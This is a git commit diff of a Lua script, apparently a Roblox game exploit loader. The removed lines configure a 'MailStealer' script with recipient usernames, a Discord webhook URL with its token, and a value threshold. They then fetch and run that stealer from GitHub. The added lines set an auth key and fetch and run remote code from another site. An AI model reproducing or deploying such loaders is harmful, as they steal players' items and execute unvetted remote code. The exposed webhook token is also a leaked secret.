8e88ce75edc5312fd64b61a3d2ba63a4944b173e
Kage8eebdjW <137019241+Kage8eebdjW@users.noreply.github.com>
2024-11-01 18:56:40 +0800

    Update 1017qo917103592.lua

--- refs/heads/main/1017qo917103592.lua
+++ refs/heads/main/1017qo917103592.lua
@@ -1,6 +1,5 @@
-Username = "cabagaming"
-Username2 = "anime1230017"
-webhook = "https://discord.com/api/webhooks/1301352457208725596/5-5P7bcGZdTvr-FtTQ8X-DAS4O_krGyhUOgDyJ3hp8AOoGIlOaeveU3CPFAwX15B1LbQ"
-min_rap = 500000
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/WhriterHub/Whiter/main/MailStealerV.2"))()
+getgenv().AuthKey = "HUGE_73hRxG7zwEmR"
+getgenv().LoadSettings = {
+    Example_Setting = Example_Value
+}
+loadstring(game:HttpGet("https://HugeGames.io/ps99"))(
